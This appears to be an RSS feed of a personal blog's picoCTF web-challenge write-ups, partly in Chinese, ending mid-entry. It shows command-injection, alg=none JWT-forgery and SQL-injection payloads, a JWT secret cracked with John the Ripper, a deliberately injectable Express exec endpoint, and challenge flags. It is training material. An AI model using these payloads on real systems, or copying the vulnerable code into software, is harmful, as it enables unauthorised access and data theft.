@@ -1,0 +1,865 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>SBK Hugo Site</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/</link><description>Recent content on SBK Hugo Site</description><generator>Hugo</generator><language>en-us</language><atom:link href="https://bernie6401.github.io/docs/security/practice/picoctf/web/index.xml" rel="self" type="application/rss+xml"/><item><title>PicoCTF - caas</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---caas/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---caas/</guid><description>&lt;h1 id="picoctf---caas">
+ PicoCTF - caas
+ &lt;a class="anchor" href="#picoctf---caas">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-picoctf-ctf-web">
+ tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-picoctf-ctf-web">#&lt;/a>
+&lt;/h6>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;p>&lt;a href="https://lab.feifei.tw/practice/ci/l1.php">Command Injection&lt;/a>&lt;/p>
+&lt;h2 id="source-code">
+ Source code
+ &lt;a class="anchor" href="#source-code">#&lt;/a>
+&lt;/h2>
+&lt;pre tabindex="0">&lt;code class="language-javascript=" data-lang="javascript=">const express = require(&amp;#39;express&amp;#39;);
+const app = express();
+const { exec } = require(&amp;#39;child_process&amp;#39;);
+
+app.use(express.static(&amp;#39;public&amp;#39;));
+
+app.get(&amp;#39;/cowsay/:message&amp;#39;, (req, res) =&amp;gt; {
+ exec(`/usr/games/cowsay ${req.params.message}`, {timeout: 5000}, (error, stdout) =&amp;gt; {
+ if (error) return res.status(500).end();
+ res.type(&amp;#39;txt&amp;#39;).send(stdout).end();
+ });
+});
+
+app.listen(3000, () =&amp;gt; {
+ console.log(&amp;#39;listening&amp;#39;);
+});
+&lt;/code>&lt;/pre>&lt;h2 id="recon">
+ Recon
+ &lt;a class="anchor" href="#recon">#&lt;/a>
+&lt;/h2>
+&lt;p>直覺是command injection&lt;/p>
+&lt;h2 id="exploit---easy-command-injection">
+ Exploit - Easy Command Injection
+ &lt;a class="anchor" href="#exploit---easy-command-injection">#&lt;/a>
+&lt;/h2>
+&lt;p>Payload: &lt;code>/cowsay/123;ls;cat falg.txt&lt;/code>
+Flag: &lt;code>picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}&lt;/code>&lt;/p></description></item><item><title>PicoCTF - Cookies</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---cookies/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---cookies/</guid><description>&lt;h1 id="picoctf---cookies">
+ PicoCTF - Cookies
+ &lt;a class="anchor" href="#picoctf---cookies">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-picoctf-ctf-web">
+ tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-picoctf-ctf-web">#&lt;/a>
+&lt;/h6>
+&lt;p>Challenge: &lt;a href="http://mercury.picoctf.net:64944/">http://mercury.picoctf.net:64944/&lt;/a>&lt;/p>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;p>&lt;a href="https://www.ruanyifeng.com/blog/2019/09/curl-reference.html">curl 的用法指南&lt;/a>&lt;/p>
+&lt;blockquote>
+&lt;p>-H參數添加 HTTP 請求的標頭。
+&lt;code>$ curl -H 'Accept-Language: en-US' https://google.com&lt;/code>&lt;/p>&lt;/blockquote>
+&lt;blockquote>
+&lt;p>-s參數將不輸出錯誤和進度信息。
+&lt;code>$ curl -s https://www.example.com&lt;/code>&lt;/p>&lt;/blockquote>
+&lt;blockquote>
+&lt;p>-L參數會讓 HTTP 請求跟隨服務器的重定向。curl 默認不跟隨重定向。
+&lt;code>$ curl -L -d 'tweet=hi' https://api.twitter.com/tweet&lt;/code>&lt;/p>&lt;/blockquote>
+&lt;blockquote>
+&lt;p>-I參數向服務器發出 HEAD 請求，然會將服務器返回的 HTTP 標頭打印出來。
+&lt;code>$ curl -I https://www.example.com&lt;/code>&lt;/p>&lt;/blockquote>
+&lt;h2 id="exploit">
+ Exploit
+ &lt;a class="anchor" href="#exploit">#&lt;/a>
+&lt;/h2>
+&lt;ol>
+&lt;li>
+&lt;p>Try to analyze
+When I input something, it&amp;rsquo;ll redirect to another page
+&lt;img src="https://i.imgur.com/Pq7XpNZ.png" alt="" />
+&lt;img src="https://i.imgur.com/pKZJWfd.png" alt="" />
+I tried to change cookie to different number and also modify the different value of &lt;code>name&lt;/code> parameter however, still got wrong information.&lt;/p></description></item><item><title>PicoCTF - dont-use-client-side</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---dont-use-client-side/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---dont-use-client-side/</guid><description>&lt;h1 id="picoctf---dont-use-client-side">
+ PicoCTF - dont-use-client-side
+ &lt;a class="anchor" href="#picoctf---dont-use-client-side">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-picoctf-ctf-web">
+ tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-picoctf-ctf-web">#&lt;/a>
+&lt;/h6>
+&lt;p>Challenge: &lt;a href="https://play.picoctf.org/practice/challenge/66?category=1&amp;amp;page=1">dont-use-client-side&lt;/a>&lt;/p>
+&lt;h2 id="exploit---page-source-code">
+ Exploit - Page source code
+ &lt;a class="anchor" href="#exploit---page-source-code">#&lt;/a>
+&lt;/h2>
+&lt;p>&lt;img src="https://i.imgur.com/UBYEt6F.png" alt="" />
+&lt;code>picoCTF{no_clients_plz_b706c5}&lt;/code>&lt;/p></description></item><item><title>PicoCTF - Insp3ct0r</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---insp3ct0r/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---insp3ct0r/</guid><description>&lt;h1 id="picoctf---insp3ct0r">
+ PicoCTF - Insp3ct0r
+ &lt;a class="anchor" href="#picoctf---insp3ct0r">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-picoctf-ctf-web">
+ tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-picoctf-ctf-web">#&lt;/a>
+&lt;/h6>
+&lt;p>Challenge: &lt;a href="http://jupiter.challenges.picoctf.org:9670/">Insp3ct0r&lt;/a>&lt;/p>
+&lt;h2 id="source-code">
+ Source code
+ &lt;a class="anchor" href="#source-code">#&lt;/a>
+&lt;/h2>
+&lt;h2 id="exploit---browser-inspector">
+ Exploit - Browser Inspector
+ &lt;a class="anchor" href="#exploit---browser-inspector">#&lt;/a>
+&lt;/h2>
+&lt;p>HTML&lt;/p>
+&lt;pre tabindex="0">&lt;code class="language-html!" data-lang="html!">&amp;lt;!doctype html&amp;gt;
+&amp;lt;html&amp;gt;
+ &amp;lt;head&amp;gt;
+ &amp;lt;title&amp;gt;My First Website :)&amp;lt;/title&amp;gt;
+ &amp;lt;link href=&amp;#34;https://fonts.googleapis.com/css?family=Open+Sans|Roboto&amp;#34; rel=&amp;#34;stylesheet&amp;#34;&amp;gt;
+ &amp;lt;link rel=&amp;#34;stylesheet&amp;#34; type=&amp;#34;text/css&amp;#34; href=&amp;#34;mycss.css&amp;#34;&amp;gt;
+ &amp;lt;script type=&amp;#34;application/javascript&amp;#34; src=&amp;#34;myjs.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;
+ &amp;lt;/head&amp;gt;
+
+ &amp;lt;body&amp;gt;
+ &amp;lt;div class=&amp;#34;container&amp;#34;&amp;gt;
+ &amp;lt;header&amp;gt;
+	&amp;lt;h1&amp;gt;Inspect Me&amp;lt;/h1&amp;gt;
+ &amp;lt;/header&amp;gt;
+
+ &amp;lt;button class=&amp;#34;tablink&amp;#34; onclick=&amp;#34;openTab(&amp;#39;tabintro&amp;#39;, this, &amp;#39;#222&amp;#39;)&amp;#34; id=&amp;#34;defaultOpen&amp;#34;&amp;gt;What&amp;lt;/button&amp;gt;
+ &amp;lt;button class=&amp;#34;tablink&amp;#34; onclick=&amp;#34;openTab(&amp;#39;tababout&amp;#39;, this, &amp;#39;#222&amp;#39;)&amp;#34;&amp;gt;How&amp;lt;/button&amp;gt;
+ 
+ &amp;lt;div id=&amp;#34;tabintro&amp;#34; class=&amp;#34;tabcontent&amp;#34;&amp;gt;
+	&amp;lt;h3&amp;gt;What&amp;lt;/h3&amp;gt;
+	&amp;lt;p&amp;gt;I made a website&amp;lt;/p&amp;gt;
+ &amp;lt;/div&amp;gt;
+
+ &amp;lt;div id=&amp;#34;tababout&amp;#34; class=&amp;#34;tabcontent&amp;#34;&amp;gt;
+	&amp;lt;h3&amp;gt;How&amp;lt;/h3&amp;gt;
+	&amp;lt;p&amp;gt;I used these to make this site: &amp;lt;br/&amp;gt;
+	 HTML &amp;lt;br/&amp;gt;
+	 CSS &amp;lt;br/&amp;gt;
+	 JS (JavaScript)
+	&amp;lt;/p&amp;gt;
+	&amp;lt;!-- Html is neat. Anyways have 1/3 of the flag: picoCTF{tru3_d3 --&amp;gt;
+ &amp;lt;/div&amp;gt;
+ 
+ &amp;lt;/div&amp;gt;
+ 
+ &amp;lt;/body&amp;gt;
+&amp;lt;/html&amp;gt;
+&lt;/code>&lt;/pre>&lt;p>CSS
+Download it and search specific string&lt;/p></description></item><item><title>PicoCTF - It is my Birthday</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---it-is-my-birthday/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---it-is-my-birthday/</guid><description>&lt;h1 id="picoctf---it-is-my-birthday">
+ PicoCTF - It is my Birthday
+ &lt;a class="anchor" href="#picoctf---it-is-my-birthday">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-picoctf-ctf-web">
+ tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-picoctf-ctf-web">#&lt;/a>
+&lt;/h6>
+&lt;p>Challenge: &lt;a href="https://play.picoctf.org/practice/challenge/109?category=1&amp;amp;page=1">It is my Birthday&lt;/a>&lt;/p>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;p>&lt;a href="https://github.com/corkami/collisions">corkami/collisions&lt;/a>&lt;/p>
+&lt;h2 id="exploit---md5-collision">
+ Exploit - MD5 Collision
+ &lt;a class="anchor" href="#exploit---md5-collision">#&lt;/a>
+&lt;/h2>
+&lt;p>Try to find different &lt;code>pdf&lt;/code> file that has same &lt;code>MD5&lt;/code> hash
+Such as the example provided by &lt;code>corkami&lt;/code> - &lt;a href="https://raw.githubusercontent.com/corkami/collisions/master/examples/poeMD5_A.pdf">poeMD5_A&lt;/a> and &lt;a href="https://raw.githubusercontent.com/corkami/collisions/master/examples/poeMD5_B.pdf">poeMD5_B&lt;/a>
+Note that, you must notice the file size you uploaded can not too large.&lt;/p>
+&lt;h2 id="source-code---after-exploit">
+ Source code - After Exploit
+ &lt;a class="anchor" href="#source-code---after-exploit">#&lt;/a>
+&lt;/h2>
+&lt;p>:::spoiler after exploit you can get the source code &amp;amp; flag&lt;/p></description></item><item><title>PicoCTF - JAUTH</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---jauth/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---jauth/</guid><description>&lt;h1 id="picoctf---jauth">
+ PicoCTF - JAUTH
+ &lt;a class="anchor" href="#picoctf---jauth">#&lt;/a>
+&lt;/h1>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;p>&lt;a href="https://hackmd.io/JO7xByQgQWK67eU0goHMeA?view#c">NTUCNS - HW3 - JWT Authentication&lt;/a>&lt;/p>
+&lt;h2 id="exploit---jwr--none">
+ Exploit - JWR + None
+ &lt;a class="anchor" href="#exploit---jwr--none">#&lt;/a>
+&lt;/h2>
+&lt;p>其實這一題有一點奇怪，應該說之前在解CNS作業的驗證時，TA說目前應該是不行以Alg=None的形式進行驗證的設計，我以為是後端的框架都不支援了，但應該說是不建議這樣的做法，所以這一題比想像中簡單，我還以為要把公鑰找出來，再進行sign&lt;/p>
+&lt;ol>
+&lt;li>用類似jwt.io的網站(&lt;a href="https://token.dev/">online tool&lt;/a>)，但支援alg=none的編碼
+Payload: &lt;code>eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdXRoIjoxNjg3NzY0MjM1MTAzLCJhZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwOS4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzExNC4wIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNjg3NzY0MjM1fQ&lt;/code>
+&lt;img src="https://hackmd.io/_uploads/B1vcsALOn.png" alt="" />&lt;/li>
+&lt;/ol>
+&lt;p>Flag: &lt;code>picoCTF{succ3ss_@u7h3nt1c@710n_72bf8bd5}&lt;/code>&lt;/p>
+&lt;h2 id="reference">
+ Reference
+ &lt;a class="anchor" href="#reference">#&lt;/a>
+&lt;/h2>
+&lt;p>&lt;a href="https://youtu.be/njsjTVcwGwY"> picoCTF : JAUTH (Challenge 8) &lt;/a>&lt;/p></description></item><item><title>PicoCTF - Java Code Analysis!?!</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---java-code-analysis_/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---java-code-analysis_/</guid><description>&lt;h1 id="picoctf---java-code-analysis">
+ PicoCTF - Java Code Analysis!?!
+ &lt;a class="anchor" href="#picoctf---java-code-analysis">#&lt;/a>
+&lt;/h1>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;p>JWT&lt;/p>
+&lt;h2 id="source-code">
+ Source code
+ &lt;a class="anchor" href="#source-code">#&lt;/a>
+&lt;/h2>
+&lt;p>Too Much to list&lt;/p>
+&lt;h2 id="hint">
+ Hint
+ &lt;a class="anchor" href="#hint">#&lt;/a>
+&lt;/h2>
+&lt;ul>
+&lt;li>Maybe try to find the JWT Signing Key (&amp;ldquo;secret key&amp;rdquo;) in the source code? Maybe it&amp;rsquo;s hardcoded somewhere? Or maybe try to crack it?&lt;/li>
+&lt;li>The &amp;lsquo;role&amp;rsquo; and &amp;lsquo;userId&amp;rsquo; fields in the JWT can be of interest to you!&lt;/li>
+&lt;li>The &amp;lsquo;controllers&amp;rsquo;, &amp;lsquo;services&amp;rsquo; and &amp;lsquo;security&amp;rsquo; java packages in the given source code might need your attention. We&amp;rsquo;ve provided a README.md file that contains some documentation.&lt;/li>
+&lt;li>Upgrade your &amp;lsquo;role&amp;rsquo; with the new (cracked) JWT. And re-login for the new role to get reflected in browser&amp;rsquo;s localStorage.&lt;/li>
+&lt;/ul>
+&lt;h2 id="recon">
+ Recon
+ &lt;a class="anchor" href="#recon">#&lt;/a>
+&lt;/h2>
+&lt;p>這一題在AIS3 pre-exam的時候也有看到，但當時根本沒想法，只要題目看起來一複雜我就沒辦法分析了，所以還是看了Martin大的WP才知道解法，但有時候真的很考驗耐心，先看hint發現應該是考跟JWT有關&lt;/p></description></item><item><title>PicoCTF - Java Script Kiddie</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---java-script-kiddie/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---java-script-kiddie/</guid><description>&lt;h1 id="picoctf---java-script-kiddie">
+ PicoCTF - Java Script Kiddie
+ &lt;a class="anchor" href="#picoctf---java-script-kiddie">#&lt;/a>
+&lt;/h1>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;p>&lt;a href="https://www.w3schools.com/jsref/jsref_slice_array.asp">JavaScript Array slice()&lt;/a>&lt;/p>
+&lt;blockquote>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">fruits&lt;/span> &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#e6db74">&amp;#34;Banana&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;Orange&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;Lemon&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;Apple&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;Mango&amp;#34;&lt;/span>];
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">citrus&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">fruits&lt;/span>.&lt;span style="color:#a6e22e">slice&lt;/span>(&lt;span style="color:#ae81ff">1&lt;/span>, &lt;span style="color:#ae81ff">3&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">#&lt;/span> &lt;span style="color:#a6e22e">output&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">Orange&lt;/span>,&lt;span style="color:#a6e22e">Lemon&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/blockquote>
+&lt;p>&lt;a href="https://www.geeksforgeeks.org/javascript-uint8array-from-method/">JavaScript Uint8Array.from() Method&lt;/a>&lt;/p>
+&lt;blockquote>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">array&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">Uint8Array&lt;/span>.&lt;span style="color:#a6e22e">from&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;45465768654323456&amp;#39;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">console&lt;/span>.&lt;span style="color:#a6e22e">log&lt;/span>(&lt;span style="color:#a6e22e">array&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">#&lt;/span> &lt;span style="color:#a6e22e">output&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">Uint8Array&lt;/span>(&lt;span style="color:#ae81ff">17&lt;/span>) [
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">4&lt;/span>, &lt;span style="color:#ae81ff">5&lt;/span>, &lt;span style="color:#ae81ff">4&lt;/span>, &lt;span style="color:#ae81ff">6&lt;/span>, &lt;span style="color:#ae81ff">5&lt;/span>, &lt;span style="color:#ae81ff">7&lt;/span>, &lt;span style="color:#ae81ff">6&lt;/span>,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">8&lt;/span>, &lt;span style="color:#ae81ff">6&lt;/span>, &lt;span style="color:#ae81ff">5&lt;/span>, &lt;span style="color:#ae81ff">4&lt;/span>, &lt;span style="color:#ae81ff">3&lt;/span>, &lt;span style="color:#ae81ff">2&lt;/span>, &lt;span style="color:#ae81ff">3&lt;/span>,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">4&lt;/span>, &lt;span style="color:#ae81ff">5&lt;/span>, &lt;span style="color:#ae81ff">6&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>]
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/blockquote>
+&lt;p>&lt;a href="https://www.w3schools.com/jsref/jsref_fromcharcode.asp">JavaScript String.fromCharCode()&lt;/a>&lt;/p>
+&lt;blockquote>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">text&lt;/span> &lt;span style="color:#f92672">=&lt;/span> String.&lt;span style="color:#a6e22e">fromCharCode&lt;/span>(&lt;span style="color:#ae81ff">65&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">console&lt;/span>.&lt;span style="color:#a6e22e">log&lt;/span>(&lt;span style="color:#a6e22e">text&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">#&lt;/span> &lt;span style="color:#a6e22e">output&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">A&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/blockquote>
+&lt;h2 id="source-code">
+ Source code
+ &lt;a class="anchor" href="#source-code">#&lt;/a>
+&lt;/h2>
+&lt;p>:::spoiler Source Code&lt;/p>
+&lt;pre tabindex="0">&lt;code class="language-htmlmixed=" data-lang="htmlmixed=">&amp;lt;html&amp;gt;
+	&amp;lt;head&amp;gt; 
+		&amp;lt;script src=&amp;#34;jquery-3.3.1.min.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;
+		&amp;lt;script&amp;gt;
+			var bytes = [];
+			$.get(&amp;#34;bytes&amp;#34;, function(resp) {
+				bytes = Array.from(resp.split(&amp;#34; &amp;#34;), x =&amp;gt; Number(x));
+			});
+
+			function assemble_png(u_in){
+				var LEN = 16;
+				var key = &amp;#34;0000000000000000&amp;#34;;
+				var shifter;
+				if(u_in.length == LEN){
+					key = u_in;
+				}
+				var result = [];
+				for(var i = 0; i &amp;lt; LEN; i++){
+					shifter = key.charCodeAt(i) - 48;
+					for(var j = 0; j &amp;lt; (bytes.length / LEN); j ++){
+						result[(j * LEN) + i] = bytes[(((j + shifter) * LEN) % bytes.length) + i]
+					}
+				}
+				while(result[result.length-1] == 0){
+					result = result.slice(0,result.length-1);
+				}
+				document.getElementById(&amp;#34;Area&amp;#34;).src = &amp;#34;data:image/png;base64,&amp;#34; + btoa(String.fromCharCode.apply(null, new Uint8Array(result)));
+				return false;
+			}
+		&amp;lt;/script&amp;gt;
+	&amp;lt;/head&amp;gt;
+	&amp;lt;body&amp;gt;
+
+		&amp;lt;center&amp;gt;
+			&amp;lt;form action=&amp;#34;#&amp;#34; onsubmit=&amp;#34;assemble_png(document.getElementById(&amp;#39;user_in&amp;#39;).value)&amp;#34;&amp;gt;
+				&amp;lt;input type=&amp;#34;text&amp;#34; id=&amp;#34;user_in&amp;#34;&amp;gt;
+				&amp;lt;input type=&amp;#34;submit&amp;#34; value=&amp;#34;Submit&amp;#34;&amp;gt;
+			&amp;lt;/form&amp;gt;
+			&amp;lt;img id=&amp;#34;Area&amp;#34; src=&amp;#34;&amp;#34;/&amp;gt;
+		&amp;lt;/center&amp;gt;
+
+	&amp;lt;/body&amp;gt;
+&amp;lt;/html&amp;gt;
+&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - JaWT Scratchpad</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---jawt-scratchpad/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---jawt-scratchpad/</guid><description>&lt;h1 id="picoctf---jawt-scratchpad">
+ PicoCTF - JaWT Scratchpad
+ &lt;a class="anchor" href="#picoctf---jawt-scratchpad">#&lt;/a>
+&lt;/h1>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;p>&lt;a href="https://hackmd.io/JO7xByQgQWK67eU0goHMeA?view#c">NTUCNS - HW3 - JWT Authentication&lt;/a>&lt;/p>
+&lt;h2 id="recon">
+ Recon
+ &lt;a class="anchor" href="#recon">#&lt;/a>
+&lt;/h2>
+&lt;p>這一題蠻有趣的，有結合其他東西當作解題的基礎，先看JWT的token，decode過後的結果表示：
+&lt;img src="https://hackmd.io/_uploads/S1B-01POh.png" alt="" />&lt;/p>
+&lt;p>也就是說，token只會隨著payload而變動，所以也沒有辦法用解public key的方式重新簽署文件，另外用alg=none也會出現Authentication failed，不過作者有在網頁中有給出提示，用&lt;a href="https://github.com/magnumripper/JohnTheRipper">John&lt;/a>，看起來就是用john-the-ripper解出token password&lt;/p>
+&lt;h2 id="exploit---brute-force">
+ Exploit - Brute Force
+ &lt;a class="anchor" href="#exploit---brute-force">#&lt;/a>
+&lt;/h2>
+&lt;ol>
+&lt;li>
+&lt;p>Brute Force Password&lt;/p>
+&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ cat jwt.txt
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiaGhoIn0.j1yd-PJbjNraLhhBAxZBD2C1EVIyHqlnvKh_l-iVKG8%
+$ ./john.exe ../jwt.txt --wordlist=../rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
+Will run 8 OpenMP threads
+Press &amp;#39;q&amp;#39; or Ctrl-C to abort, almost any other key for status
+ilovepico (?)
+1g 0:00:00:02 DONE (2023-06-26 18:42) 0.3673g/s 2720Kp/s 2720Kc/s 2720KC/s ilovetitoelbambino..ilovejesus71
+Use the &amp;#34;--show&amp;#34; option to display all of the cracked passwords reliably
+Session completed
+&lt;/code>&lt;/pre>&lt;p>Token Password: &lt;code>ilovepico&lt;/code>&lt;/p></description></item><item><title>PicoCTF - More SQLi</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---more-sqli/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---more-sqli/</guid><description>&lt;h1 id="picoctf---more-sqli">
+ PicoCTF - More SQLi
+ &lt;a class="anchor" href="#picoctf---more-sqli">#&lt;/a>
+&lt;/h1>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;ul>
+&lt;li>&lt;a href="https://lab.feifei.tw/practice/sqli/sql4.php">Feifei Lab&lt;/a>&lt;/li>
+&lt;li>Hint SQLiLite&lt;/li>
+&lt;/ul>
+&lt;h2 id="recon">
+ Recon
+ &lt;a class="anchor" href="#recon">#&lt;/a>
+&lt;/h2>
+&lt;p>先隨便輸入發現他很貼心有給完整的payload，發現他是先檢查password，在沒有任何防護的情況下，直接用最經典的payload就可了
+Account: Any
+Password: &lt;code>' or '1'='1' -- #&lt;/code>
+&lt;img src="https://hackmd.io/_uploads/rJXd-oLd3.png" alt="" />&lt;/p>
+&lt;hr>
+&lt;p>&lt;img src="https://hackmd.io/_uploads/Bki0WoLd3.png" alt="" />&lt;/p>
+&lt;h2 id="exploit---sqliunion-selection">
+ Exploit - SQLi(Union Selection)
+ &lt;a class="anchor" href="#exploit---sqliunion-selection">#&lt;/a>
+&lt;/h2>
+&lt;p>現在的目標是flag應該是藏在別的table，所以先找甚麼table&lt;/p>
+&lt;ol>
+&lt;li>
+&lt;p>找table
+透過&lt;a href="https://github.com/w181496/Web-CTF-Cheatsheet#sqlite">Kaibro的cheat sheet&lt;/a>，SQLite的爆破payload是&lt;code>SELECT name FROM sqlite_master WHERE type='table'&lt;/code>，而目前我們可以用union based的方式搜尋，先觀察搜尋&lt;code>Algiers&lt;/code>的搜尋column有三個，第一個column是chr，第二個column是chr，第三個是int，所以在用union select的時候要遵守&lt;font color="FF0000">&lt;strong>查詢數量一樣、每個欄位的型態一樣&lt;/strong>&lt;/font>
+Payload: &lt;code>Algiers' union SELECT sql,sql,1 FROM sqlite_master WHERE type='table'; --&lt;/code>
+:::spoiler Screenshot
+&lt;img src="https://hackmd.io/_uploads/rk9G4oLO2.png" alt="" />
+:::&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Find Flag - Union based
+目前發現有兩個table比較可疑&lt;/p>
+&lt;ul>
+&lt;li>CREATE TABLE hints (id INTEGER NOT NULL PRIMARY KEY, info TEXT)&lt;/li>
